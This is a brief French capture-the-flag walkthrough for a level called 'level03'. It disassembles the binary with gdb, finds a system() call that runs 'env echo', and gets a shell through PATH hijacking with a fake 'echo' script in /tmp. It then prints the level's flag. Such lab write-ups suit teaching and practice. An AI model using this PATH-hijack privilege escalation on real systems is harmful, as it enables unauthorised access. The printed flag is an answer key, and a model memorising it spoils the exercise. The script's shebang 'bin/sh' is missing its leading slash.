En arrivant sur le niveau avec ```ls``` on trouve un executable ```level03```

Avec ```gdb level03``` on peut ```disas main``` et on trouve un appel ```system()```

En utilisant ```x/s <addresse param appel system>``` On voit aue les param sont ```/usr/bin/env echo Exploit me```

On va remplacer le chemin ou il cherche ce echo et faire un echo frauduleux

On va dans ```cd /tmp/``` et on fait notre fake echo avec ```echo -e '#!bin/sh\n/bin/sh' > echo```

On lui donne les drtois exec avec ```chmod +x echo```

Ensuite on va modifier les variables d'env avec ```export PATH=/tmp:$PATH```

Puis on retour la ou est notre executable de base ```cd && ./level03```

Et la ca prend notre fake echo qui lance ```/bin/sh``` on lui donne la commande ```getflag``` pour avoir notre flag = ```qi0maab88jeaj46qoumi7maus```